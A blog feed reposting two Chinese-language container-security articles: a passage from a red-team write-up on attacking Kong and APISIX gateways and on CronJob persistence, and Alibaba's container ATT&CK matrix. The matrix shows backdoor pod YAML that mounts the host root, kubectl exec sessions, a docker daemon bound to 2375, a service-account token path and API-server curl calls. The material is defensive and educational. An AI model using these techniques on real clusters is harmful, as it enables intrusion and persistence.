DevOps 平台可能会包含不同的 Low-Code 流水线特性，隔离上也会大量采用我们上面提及的多租户容器集群设计，所以多租户集群下的渗透测试技巧也大致无二。</p></li><li><p>控制了上述的多租户容器集群是可以控制集群所用节点服务器的，这些服务器的作用一般用于编译和构建业务代码，并接入代码管理站点如 Gitlab、Github 等，所以一般拥有获取企业程序各业务源码的权限。</p></li><li><p>DevOps 及其相关的平台其最重要的能力之一就是 CICD，因此控制 DevOps 也就间接拥有了从办公网、开发网突破进入生产网的方法；控制的应用数量和业务种类越多，也能根据应用的不同进入不同的隔离区。</p></li></ol><p>另外在 DevOps 平台内若集成了日志组件（云原生的重点之一：可观察性）的话，那么日志组件和 Agent 的升级、安装问题一般会是重中之重，蓝军可以根据这个点达到获取公司内任意主机权限的目地。  </p><h2 id="12-云原生-API-网关"><a href="#12-云原生-API-网关" class="headerlink" title="12. 云原生 API 网关"></a>12. 云原生 API 网关</h2><p>作为 API 网关，它具有管理集群南北流量的功能，一般也可能作为集群流量的入口和出口（ingress&#x2F;egress）。而作为标榜云原生特性的 API 网关产品，似乎无一例外都会具有动态配置、灵活修改、远程管理的特性，而这些特性往往以 REST API 对外提供服务。</p><p>然而在远程配置逻辑的鉴权能力上，身为网关这种基础网络的产品，各个受欢迎的开源组件在默认安全的实现上似乎还需努力。</p><p>以 Kong 为例，Kong API 网关 (<a href="https://github.com/Kong/kong">https://github.com/Kong/kong</a>) 是目前最受欢迎的云原生 API 网关之一，有开源版和企业版两个分支，被广泛应用于云原生、微服务、分布式、无服务云函数等场景的 API 接入中间件，为云原生应用提供鉴权，转发，负载均衡，监控等能力。</p><p>我们曾经在一次渗透测试中使用 Kong 的远程配置能力突破外网进入到内网环境中，可以参考之前的预警文章<strong>《腾讯蓝军安全提醒：开源云原生 API 网关 Kong 可能会成为攻击方进入企业内网的新入口》</strong></p><p>Kong 使用 Kong Admin Rest API 作为管理 Kong Proxy 能力的关键入口，以支持最大程度的灵活性；在开源分支里，这个管理入口是没有鉴权能力的 (Kong 企业版支持对 Kong Admin Rest API 进行角色控制和鉴权)，Kong 建议用户在网络层进行访问控制；当攻击方可以访问到这个 API，他就具有了 Kong Proxy 的所有能力，可以查看和修改企业当前在南北流量管理上的配置，可以直接控制 API 网关使其成为一个开放性的流量代理 (比 SSRF 更便于使用和利用)；从攻击方的角度思考，控制了这个 API 等于是拥有了摸清网络架构和打破网络边界的能力。</p><p>当蓝军可以访问到 Kong Admin Rest API  和  Kong Proxy 时，蓝军可以通过以下步骤创建一个通往内网的代理：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftiaxerLLF2Lib6bAylq9yJDuxgYKKhEHdljWZRqe0bhoF3mQc3ydxZQZA/640?wx_fmt=png" alt="图片"></p><p>至此，蓝军从外网发往 Kong Proxy 的流量只要 host 头带有 target.com 就会转发到内网的 target.com:443 中，实际利用手法会根据内网和目标站点配置的不同而变化。</p><p>而目前 Kong 的开源分支里是不支持给 Kong Admin Rest API 添加相应的鉴权能力的，只可以改变监听的网卡，或使用设置 Network Policy、 iptables、安全组等方式进行网络上隔离。现在最常见的方式就是不开放外网，只允许内网访问。也因为如此，如果已经进入到内网，API 网关的管理接口会成为我首要的攻击目标之一，借此我们可以摸清当前集群对内对外提供的相关能力，更有可能直接获取流量出入口容器的 Shell 权限。</p><h2 id="12-1-APISIX-的-RCE-利用"><a href="#12-1-APISIX-的-RCE-利用" class="headerlink" title="12.1. APISIX 的 RCE 利用"></a>12.1. APISIX 的 RCE 利用</h2><p>另外一个值得深入的开源组件就是 Apache APISIX，这是一款基于 lua 语言开发，是一个动态、实时、高性能的 API 网关， 提供负载均衡、动态上游、灰度发布、服务熔断、身份认证、可观测性等丰富的流量管理功能。</p><p>APISIX 提供了 REST Admin API 功能，用户可以使用 REST Admin API 来管理 APISIX，默认情况下只允许 127.0.0.1 访问，用户可以修改 conf&#x2F;config.yaml 中的 allow_admin 字段，指定允许调用 Admin API 的 ip 列表。</p><p>当用户对外开启了 Admin API 且未修改硬编码的缺省 admin_key 的情况下，攻击者可以利用该 admin_key 执行任意 lua 代码。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSfto8mHNHeB77LoDPhFESbBegaNiaib0BALNkDWrh3x1EBAdoK89x01Hq1w/640?wx_fmt=png" alt="图片"></p><p>根据 apisix 官方文档可以知道，在创建路由时用户可以定义一个 filter_func 参数用于处理请求，filter_func 的内容可以是任意的 lua 代码。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftIfSbPDUz124AichVhhvGTaueXiba0Ja0E4ZyFYZRQWOp9yfsRCpRDlAA/640?wx_fmt=png" alt="图片"></p><p>那么我们便可以使用默认的 admin_key 创建恶意的 route 并访问以触发 lua 代码执行，达到 rce 的目的，下面是具体步骤：</p><p><strong>（1）创建可用的 services:</strong></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftst9v4ibA2LYdvG3nqMhTHDicGqXvKq7PmofK2tK15SPF6DNVMLWf8BJw/640?wx_fmt=png" alt="图片"></p><p><strong>（2）创建恶意的 route:</strong></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftLVN26q4XLteqAicQINLQ2bBY9jmnP0Jp3hCf5Jn9WriaXiagfaibMYLl8A/640?wx_fmt=png" alt="图片"></p><p>最后访问 <a href="http://127.0.0.1:9080/api/tforce_test">http://127.0.0.1:9080/api/tforce_test</a> 即可触发预定义的 lua 代码执行。</p><p>因此，在内网里攻击云原生 API 网关是比较容易打开一定局面的。</p><h2 id="13-其它利用场景和手法"><a href="#13-其它利用场景和手法" class="headerlink" title="13. 其它利用场景和手法"></a>13. 其它利用场景和手法</h2><h2 id="13-1-从-CronJob-谈持久化"><a href="#13-1-从-CronJob-谈持久化" class="headerlink" title="13.1. 从 CronJob 谈持久化"></a>13.1. 从 CronJob 谈持久化</h2><p>因为 CronJob 的设计和 Linux CronTab 过于相似，所以很多人都会把其引申为在 Kubernetes 集群攻击的一些持久化思路。  </p><p>官方文档</p><p><a href="https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/">https://Kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/</a> 里也谈及了 CronJob 和 CronTab 的对比， 这个技术也确实可以和 CronTab 一样一定程度上可以满足持久化的场景。</p><p>这里有一个我们预研时使用的  CronJob 配置：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftrrCeuxvK2FlC1SVIZx0jOQOrVfgibPg7Acwq8xadYojuKht8HvebhyQ/640?wx_fmt=png" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftWJSdjSw4orHiagibFcg9JWAE78DBABCVudY6DVfAHKs6ibbKQntYicsjFQ/640?wx_fmt=png" alt="图片"></p><p>此处的配置会隔每分钟创建一个具有生命周期的 POD，同时这些容器也可以使用特权容器（如上述配置）、挂载大目录等设置，此时持久化创建的 POD 就可以拥有特权和访问宿主机根目录文件的权限。</p><p>不过实际对抗过程中，虽然我们也会对恶意的 POD 和容器做一定的持久化，但是直接使用 CronJob 的概率却不高。在创建后门 POD 的时候，直接使用 restartPolicy: Always 就可以方便优雅的进行后门进程的重启和维持，所以对 CronJob 的需求反而没那么高。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftVUtO0jicZWfyBIVotbJ1D2uhQ3slMibqowUq21tdNoPlZeHQciauJN0Fw/640?wx_fmt=png" alt="图片"></p><h2 id="14-致谢"><a href="#14-致谢" class="headerlink" title="14. 致谢"></a>14. 致谢</h2><p>[WIP]</p><p>也感谢您读到现在，这篇文章匆忙构成肯定有不周到或描述不正确的地方，期待业界师傅们用各种方式指正勘误。</p><h2 id="15-引用"><a href="#15-引用" class="headerlink" title="15. 引用"></a>15. 引用</h2><ol><li><a href="https://github.com/cdk-team/CDK/">https://github.com/cdk-team/CDK/</a></li><li><a href="https://force.tencent.com/docs/CIS2020-Attack-in-a-Service-Mesh-Public.pdf?v=1">https://force.tencent.com/docs/CIS2020-Attack-in-a-Service-Mesh-Public.pdf?v=1</a></li><li><a href="https://github.com/cncf/toc/blob/master/DEFINITION.md">https://github.com/cncf/toc/blob/master/DEFINITION.md</a></li><li><a href="https://www.cncf.io/blog/2017/04/26/service-mesh-critical-component-cloud-native-stack/">https://www.cncf.io/blog/2017/04/26/service-mesh-critical-component-cloud-native-stack/</a></li><li><a href="https://github.com/lxc/lxcfs">https://github.com/lxc/lxcfs</a></li><li><a href="https://github.com/cdr/code-server">https://github.com/cdr/code-server</a></li><li><a href="https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands">https://Kubernetes.io/docs/reference/generated/kubectl/kubectl-commands</a></li><li><a href="https://thehackernews.com/2021/01/new-docker-container-escape-bug-affects.html">https://thehackernews.com/2021/01/new-docker-container-escape-bug-affects.html</a></li><li><a href="https://medium.com/jorgeacetozi/Kubernetes-master-components-etcd-api-server-controller-manager-and-scheduler-3a0179fc8186">https://medium.com/jorgeacetozi/Kubernetes-master-components-etcd-api-server-controller-manager-and-scheduler-3a0179fc8186</a></li><li><a href="https://wohin.me/rong-qi-tao-yi-gong-fang-xi-lie-yi-tao-yi-ji-zhu-gai-lan/#4-2-procfs-">https://wohin.me/rong-qi-tao-yi-gong-fang-xi-lie-yi-tao-yi-ji-zhu-gai-lan/#4-2-procfs-</a></li><li><a href="https://security.tencent.com/index.php/announcement/msg/193">https://security.tencent.com/index.php/announcement/msg/193</a></li><li><a href="https://www.freebuf.com/vuls/196993.html">https://www.freebuf.com/vuls/196993.html</a></li><li><a href="https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/">https://Kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/</a></li><li><a href="https://kubernetes.io/zh/docs/reference/command-line-tools-reference/kubelet/">https://Kubernetes.io/zh/docs/reference/command-line-tools-reference/kubelet/</a></li><li><a href="https://www.cdxy.me/?p=827">https://www.cdxy.me/?p=827</a></li><li><a href="https://medium.com/jorgeacetozi/kubernetes-master-components-etcd-api-server-controller-manager-and-scheduler-3a0179fc8186">https://medium.com/jorgeacetozi/kubernetes-master-components-etcd-api-server-controller-manager-and-scheduler-3a0179fc8186</a></li><li><a href="https://github.com/neargle/CVE-2018-6574-POC">https://github.com/neargle/CVE-2018-6574-POC</a></li><li><a href="https://www.serverless.com/blog/serverless-faas-vs-containers/">https://www.serverless.com/blog/serverless-faas-vs-containers/</a></li><li><a href="https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands">https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands</a></li><li><a href="https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/">https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kubernetes</tag>
      
      <tag>转载</tag>
      
      <tag>安全</tag>
      
      <tag>容器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>阿里云 容器ATT&amp;CK攻防矩阵</title>
    <link href="/2023/01/30/%E9%98%BF%E9%87%8C%E4%BA%91%E5%AE%B9%E5%99%A8ATTCK%E6%94%BB%E9%98%B2%E7%9F%A9%E9%98%B5/"/>
    <url>/2023/01/30/%E9%98%BF%E9%87%8C%E4%BA%91%E5%AE%B9%E5%99%A8ATTCK%E6%94%BB%E9%98%B2%E7%9F%A9%E9%98%B5/</url>
    
    <content type="html"><![CDATA[<h1 id="阿里云-容器ATT-amp-CK攻防矩阵"><a href="#阿里云-容器ATT-amp-CK攻防矩阵" class="headerlink" title="阿里云 容器ATT&amp;CK攻防矩阵"></a>阿里云 容器ATT&amp;CK攻防矩阵</h1><blockquote><p>本文转载自：阿里云  <a href="https://developer.aliyun.com/article/765449?groupCode=aliyunsecurity">国内首个云上容器ATT&amp;CK攻防矩阵发布，阿里云助力企业容器化安全落地</a></p></blockquote><h1 id="关键字："><a href="#关键字：" class="headerlink" title="关键字："></a>关键字：</h1><p>Attack Matrix、ATT&amp;CK、云原生、容器化、容器安全、K8S、Docker、阿里云、AK 泄露、恶意镜像、黑客入侵、运行时安全、镜像安全</p><h1 id="容器化带来的安全隐患"><a href="#容器化带来的安全隐患" class="headerlink" title="容器化带来的安全隐患"></a>容器化带来的安全隐患</h1><p>过去的2019 年是企业容器化爆发的一年。据统计已经有超过 90% 的互联网企业正在部署或使用容器，希望能通过更为敏捷的方式快速响应市场需求。</p><p>然而，伴随着容器技术的快速发展，容器安全问题也逐渐成为企业所关注的话题，同时，开发和运维人员缺乏对容器的安全威胁和最佳实践的认识也可能会使业务从一开始就埋下安全隐患。Tripwire的调研显示，60%的受访者所在公司在过去的一年中发生过至少一起容器安全事故。在部署规模超过100个容器的公司中，安全事故的比例上升到了75%，由此可见，快速拥抱容器化带来的安全风险不容忽视。本文对云上容器ATT&amp;CK矩阵做了详细阐述，希望能帮助开发和运维人员了解容器的安全风险和落地安全实践。</p><h1 id="一、云上容器ATT-amp-CK攻防矩阵概览"><a href="#一、云上容器ATT-amp-CK攻防矩阵概览" class="headerlink" title="一、云上容器ATT&amp;CK攻防矩阵概览"></a>一、云上容器ATT&amp;CK攻防矩阵概览</h1><p>ATT＆CK®框架（Reference ATTACK Matrix for Container on Cloud）是网络攻击中涉及的已知策略和技术的知识库。为便于企业构建容器化应用安全体系，阿里云在传统主机安全的基础上，围绕自建容器集群以及云原生容器服务场景，通过全面分析黑客攻击Docker和K8s的过程和手段，推出容器安全ATT&amp;CK攻防矩阵，让黑客无所遁形，助力企业全面提升容器安全能力水位。</p><p><img src="https://ucc.alicdn.com/pic/developer-ecology/729c8c14b26d432f9e9368a45b84d731.png" alt="1.png"></p><h1 id="二、云上容器ATT-amp-CK攻防矩阵详解"><a href="#二、云上容器ATT-amp-CK攻防矩阵详解" class="headerlink" title="二、云上容器ATT&amp;CK攻防矩阵详解"></a>二、云上容器ATT&amp;CK攻防矩阵详解</h1><h2 id="1-Initial-Access-x2F-初始访问"><a href="#1-Initial-Access-x2F-初始访问" class="headerlink" title="1. Initial Access&#x2F;初始访问"></a>1. Initial Access&#x2F;初始访问</h2><h3 id="1-1-云账号AK泄露"><a href="#1-1-云账号AK泄露" class="headerlink" title="1.1 云账号AK泄露"></a>1.1 云账号AK泄露</h3><p>云平台安全是云服务(容器服务、VM服务)的基础，如果业务代码需要通过AccessKey的方式进行鉴权并与云服务通信，应至少为每个云服务创建子账号并赋予需要的最小权限，同时推荐使用云平台提供的角色（如阿里云RAM角色）进行认证和授权。在实践中我们发现，存在部分管理员在进行代码托管时，使用主账号AK(拥有全部云资源控制权限)并不慎将其泄露到公开仓库（如Github），进而导致其云服务遭受入侵的场景，针对这一风险点，需要企业在使用云原生服务及容器化应用的过程中时刻关注。</p><h3 id="1-2-使用恶意镜像"><a href="#1-2-使用恶意镜像" class="headerlink" title="1.2 使用恶意镜像"></a>1.2 使用恶意镜像</h3><p>部分容器开发者会使用公开的镜像源(如dockerhub)下载镜像并在业务环境中运行，但如果不慎使用了存在漏洞的镜像，会给业务带来安全风险。此外，攻击者时常会将恶意镜像部署到dockerhub，并通过诱导安装或链路劫持对企业进行供应链攻击。</p><p>示例：一个在Dockerhub中伪装成mysql的恶意镜像，同时携带了挖矿程序：</p><p><img src="https://ucc.alicdn.com/pic/developer-ecology/02b511c0ed444a0b8730c79e397171ce.png" alt="2挖矿程序.png"></p><h3 id="1-3-K8s-API-Server未授权访问"><a href="#1-3-K8s-API-Server未授权访问" class="headerlink" title="1.3 K8s API Server未授权访问"></a>1.3 K8s API Server未授权访问</h3><p>K8s API Server作为K8s集群的管理入口，通常使用8080和6443端口，其中8080端口无需认证，6443端口需要认证且有TLS保护。</p><p>如果开发者使用8080端口，并将其暴露在公网上，攻击者就可以通过该端口API，直接对集群下发指令，或访问&#x2F;ui进入K8s集群管理dashboard，操作K8s实施破坏。</p><h3 id="1-4-K8s-configfile泄露"><a href="#1-4-K8s-configfile泄露" class="headerlink" title="1.4 K8s configfile泄露"></a>1.4 K8s configfile泄露</h3><p>K8s configfile作为k8s集群的管理凭证，其中包含有关K8s集群的详细信息，包括它们API Server的地址和登录凭证。在购买托管容器服务时，云厂商会向用户提供该文件以便于用户可以通过kubectl对集群进行管理。如果攻击者能够访问到此文件（如办公网员工机器入侵、泄露到Github的代码等），就可以直接通过API Server接管K8s集群，带来风险隐患。</p><p>示例：阿里云容器服务K8s configfile：</p><p><img src="https://ucc.alicdn.com/pic/developer-ecology/14cf43fd489b4c35bd23abce152737f9.png" alt="3configfile.png"></p><h3 id="1-5-Docker-daemon公网暴露"><a href="#1-5-Docker-daemon公网暴露" class="headerlink" title="1.5 Docker daemon公网暴露"></a>1.5 Docker daemon公网暴露</h3><p>Docker以client-server模式工作，其中docker daemon服务在后台运行，负责管理容器的创建、运行和停止操作，并提供docker许多其他运行时功能。执行docker命令会调用一个客户端，该客户端通过Docker的REST API将命令发送到服务端(docker daemon)。</p><p>在Linux主机上，docker daemon监听它在&#x2F;var&#x2F;run&#x2F;docker.sock中创建的unix socket。为了使docker daemon可管理，可以通过配置TCP socket将其暴露在网络中，一般情况下2375端口用于未认证的HTTP通信，2376用于可信的HTTPS通信。</p><p>如果管理员测试业务时配置不当导致docker.sock通过2375暴露在公网，攻击者即可通过该API接管docker服务。</p><p>示例：Docker daemon的2375端口的暴露：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker daemon -H tcp:<span class="hljs-regexp">//</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">2375</span> -H unix:<span class="hljs-regexp">//</span><span class="hljs-regexp">/var/</span>run/docker.sock<br></code></pre></td></tr></table></figure><h3 id="1-6-容器内应用漏洞入侵"><a href="#1-6-容器内应用漏洞入侵" class="headerlink" title="1.6 容器内应用漏洞入侵"></a>1.6 容器内应用漏洞入侵</h3><p>同主机安全一样，容器中运行的应用侧漏洞（如WEB应用RCE漏洞、Redis未授权访问等）也会成为黑客的突破口，攻击者可以利用这些漏洞进入容器内部并发起进一步攻击。</p><h3 id="1-7-Master节点SSH登录凭证泄露"><a href="#1-7-Master节点SSH登录凭证泄露" class="headerlink" title="1.7 Master节点SSH登录凭证泄露"></a>1.7 Master节点SSH登录凭证泄露</h3><p>常见的容器集群管理方式是通过登录Master节点或运维跳板机，然后再通过kubectl命令工具来控制k8s。在此情况下，前置节点的SSH凭证泄露或被攻破也会使K8s集群暴露在风险中。</p><p><img src="https://ucc.alicdn.com/pic/developer-ecology/a2c78e0ab352456e8e2218e89e1edb92.png" alt="4风险中.png"></p><h3 id="1-8-私有镜像库暴露"><a href="#1-8-私有镜像库暴露" class="headerlink" title="1.8 私有镜像库暴露"></a>1.8 私有镜像库暴露</h3><p>在容器化应用场景中，公司使用镜像来进行持续集成和自动化部署，这些镜像往往通过专用的私有镜像库来管理。暴露在公网的私有镜像库极有可能遭受攻击者入侵，并通过劫持供应链来渗透下游业务。</p><p>以Harbor为例，Harbor是一个用于存储和分发Docker镜像的企业级Registry开源服务器，集成了Docker Hub、Docker Registry、谷歌容器等。它提供了一个简单的GUI，允许用户根据自己的权限下载、上传和扫描镜像。在过去的数年里，Harbor逐渐受到人们的关注并成为CNCF的孵化项目，被企业广泛应用。Harbor在2019年披露了一个严重漏洞CVE-2019-16097，该漏洞允许攻击者通过发送恶意请求以管理员权限创建用户，从而接管Harbor。该漏洞利用方式简单，对暴露在公网的Harbor服务构成较大威胁。</p><h2 id="2-Execution-x2F-执行"><a href="#2-Execution-x2F-执行" class="headerlink" title="2. Execution&#x2F;执行"></a>2. Execution&#x2F;执行</h2><h3 id="2-1-通过kubectl进入容器"><a href="#2-1-通过kubectl进入容器" class="headerlink" title="2.1 通过kubectl进入容器"></a>2.1 通过kubectl进入容器</h3><p>Kubectl是一个管理k8s集群的命令行工具，kubectl在$HOME&#x2F;.kube目录中寻找一个名为config的文件并连接API Server进行鉴权操作。攻击者可以通过kubectl exec指令在任意pod内部执行命令。</p><p>示例：kubectl exec进入pod内部执行指令：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">xy</span>@x-<span class="hljs-number">8</span> ~/D/t/K8s_demo&gt; kubectl get pod<br><span class="hljs-attribute">NAME</span>         READY   STATUS    RESTARTS   AGE<br><span class="hljs-attribute">app</span>-<span class="hljs-number">1</span>-wp-<span class="hljs-number">0</span>   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>     Running   <span class="hljs-number">0</span>          <span class="hljs-number">182</span>d<br><span class="hljs-attribute">app</span>-<span class="hljs-number">1</span>-wp-<span class="hljs-number">1</span>   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>     Running   <span class="hljs-number">0</span>          <span class="hljs-number">182</span>d<br><span class="hljs-attribute">myapp</span>        <span class="hljs-number">1</span>/<span class="hljs-number">1</span>     Running   <span class="hljs-number">0</span>          <span class="hljs-number">11</span>d<br><span class="hljs-attribute">myappnew</span>     <span class="hljs-number">1</span>/<span class="hljs-number">1</span>     Running   <span class="hljs-number">0</span>          <span class="hljs-number">11</span>d<br><span class="hljs-attribute">xy</span>@x-<span class="hljs-number">8</span> ~/D/t/K8s_demo&gt; kubectl exec -it myappnew /bin/bash<br><span class="hljs-attribute">root</span>@myappnew:/# whoami<br><span class="hljs-attribute">root</span><br></code></pre></td></tr></table></figure><h3 id="2-2-创建后门容器"><a href="#2-2-创建后门容器" class="headerlink" title="2.2 创建后门容器"></a>2.2 创建后门容器</h3><p>攻击者可通过拥有pods权限的用户创建基础镜像并利用其执行后续渗透操作。</p><p>示例：通过yaml文件创建pod，并将pod的根目录&#x2F;挂载到容器&#x2F;mnt目录下，操作宿主机文件：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs scss">xy<span class="hljs-keyword">@x-</span><span class="hljs-number">8</span> ~/D/test&gt; cat mymaster.yaml<br><span class="hljs-attribute">apiVersion</span>: v1<br><span class="hljs-attribute">kind</span>: Pod<br><span class="hljs-attribute">metadata</span>:<br>  <span class="hljs-attribute">name</span>: myappnew<br><span class="hljs-attribute">spec</span>:<br>  <span class="hljs-attribute">containers</span>:<br>  - <span class="hljs-attribute">image</span>: nginx<br>    <span class="hljs-attribute">name</span>: container<br>    <span class="hljs-attribute">volumeMounts</span>:<br>    - <span class="hljs-attribute">mountPath</span>: /mnt<br>      <span class="hljs-attribute">name</span>: test-volume<br>  <span class="hljs-attribute">volumes</span>:<br>  - <span class="hljs-attribute">name</span>: test-volume<br>    <span class="hljs-attribute">hostPath</span>:<br>      <span class="hljs-attribute">path</span>: /<br>xy<span class="hljs-keyword">@x-</span><span class="hljs-number">8</span> ~/D/test&gt; kubectl create -f ~/Desktop/test/mymaster.yaml<br>pod/myappnew created<br>xy<span class="hljs-keyword">@x-</span><span class="hljs-number">8</span> ~/D/test&gt; kubectl exec -it myappnew /bin/bash<br>root<span class="hljs-keyword">@myappnew</span>:/# cd /mnt<br>root<span class="hljs-keyword">@myappnew</span>:/mnt# ls<br>bin   checkapp  etc   lib    lost+found  mnt  proc  run   srv  tmp  var<br>boot  dev   home  lib64  media   opt  root  sbin  sys  usr<br></code></pre></td></tr></table></figure><h3 id="2-3-通过K8s控制器部署后门容器"><a href="#2-3-通过K8s控制器部署后门容器" class="headerlink" title="2.3 通过K8s控制器部署后门容器"></a>2.3 通过K8s控制器部署后门容器</h3><p>Kubernetes中运行了一系列控制器(Controllers)来确保集群的当前状态与期望状态保持一致。例如，ReplicaSet控制器负责维护集群中运行的Pod数量；Node控制器负责监控节点的状态，并在节点出现故障时及时做出响应。</p><p>攻击者在拥有controllers权限情况下可以通过ReplicaSet&#x2F;DaemonSet&#x2F;Deplyment创建并维持后门容器。</p><p>示例：攻击者通过controllers攻击：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs scss">xy<span class="hljs-keyword">@x-</span><span class="hljs-number">8</span> ~/D/test&gt; cat nginx-deploy.yaml<br><span class="hljs-attribute">apiVersion</span>: apps/v1<br><span class="hljs-attribute">kind</span>: Deployment<br><span class="hljs-attribute">metadata</span>:<br>  <span class="hljs-attribute">name</span>: nginx-deployment<br>  <span class="hljs-attribute">labels</span>:<br>    <span class="hljs-attribute">app</span>: nginx-test<br><span class="hljs-attribute">spec</span>:<br>  <span class="hljs-attribute">replicas</span>: <span class="hljs-number">1</span><br>  <span class="hljs-attribute">selector</span>:<br>    <span class="hljs-attribute">matchLabels</span>:<br>      <span class="hljs-attribute">app</span>: nginx<br>  <span class="hljs-attribute">template</span>:<br>    <span class="hljs-attribute">metadata</span>:<br>      <span class="hljs-attribute">labels</span>:<br>        <span class="hljs-attribute">app</span>: nginx<br>    <span class="hljs-attribute">spec</span>:<br>      <span class="hljs-attribute">containers</span>:<br>      - <span class="hljs-attribute">image</span>: nginx<br>        <span class="hljs-attribute">name</span>: container<br>        <span class="hljs-attribute">volumeMounts</span>:<br>        - <span class="hljs-attribute">mountPath</span>: /mnt<br>          <span class="hljs-attribute">name</span>: test-volume<br>      <span class="hljs-attribute">volumes</span>:<br>      - <span class="hljs-attribute">name</span>: test-volume<br>        <span class="hljs-attribute">hostPath</span>:<br>          <span class="hljs-attribute">path</span>: /<br>xy<span class="hljs-keyword">@x-</span><span class="hljs-number">8</span> ~/D/test&gt; kubectl apply -f nginx-deploy.yaml<br>deployment.apps/nginx-deployment created<br>xy<span class="hljs-keyword">@x-</span><span class="hljs-number">8</span> ~/D/test&gt; kubectl get pods<br>NAME                               READY   STATUS    RESTARTS   AGE<br>app-<span class="hljs-number">1</span>-wp-<span class="hljs-number">0</span>                         <span class="hljs-number">1</span>/<span class="hljs-number">1</span>     Running   <span class="hljs-number">0</span>          <span class="hljs-number">183</span>d<br>app-<span class="hljs-number">1</span>-wp-<span class="hljs-number">1</span>                         <span class="hljs-number">1</span>/<span class="hljs-number">1</span>     Running   <span class="hljs-number">0</span>          <span class="hljs-number">183</span>d<br>myapp                              <span class="hljs-number">1</span>/<span class="hljs-number">1</span>     Running   <span class="hljs-number">0</span>          <span class="hljs-number">12</span>d<br>myappnew                           <span class="hljs-number">1</span>/<span class="hljs-number">1</span>     Running   <span class="hljs-number">0</span>          <span class="hljs-number">38</span>m<br>nginx-deployment-b676778d6-lcz4p   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>     Running   <span class="hljs-number">0</span>          <span class="hljs-number">55s</span><br></code></pre></td></tr></table></figure><h3 id="2-4-利用Service-Account连接API-Server执行指令"><a href="#2-4-利用Service-Account连接API-Server执行指令" class="headerlink" title="2.4 利用Service Account连接API Server执行指令"></a>2.4 利用Service Account连接API Server执行指令</h3><p>Kubernetes区分用户和服务(Service Account)两种账户，其中用户账户便于管理员与集群交互，服务账号用于Pod进程调用Kubernetes API或其他外部服务。</p><p>K8s pod中默认携带服务账户的访问凭证，如果被入侵的pod存在高权限的用户，则容器中可以直接通过service account向K8s下发指令。</p><p>示例：service account在容器内部的默认路径：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/secrets/</span>kubernetes.io/serviceaccount<br></code></pre></td></tr></table></figure><p>示例：带凭证访问API server的方式：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -voa  -s  https:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">0.234</span>:<span class="hljs-number">6443</span>/version<br><span class="hljs-comment"># 以下命令相当于 kubectl get no</span><br>curl -s https:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span 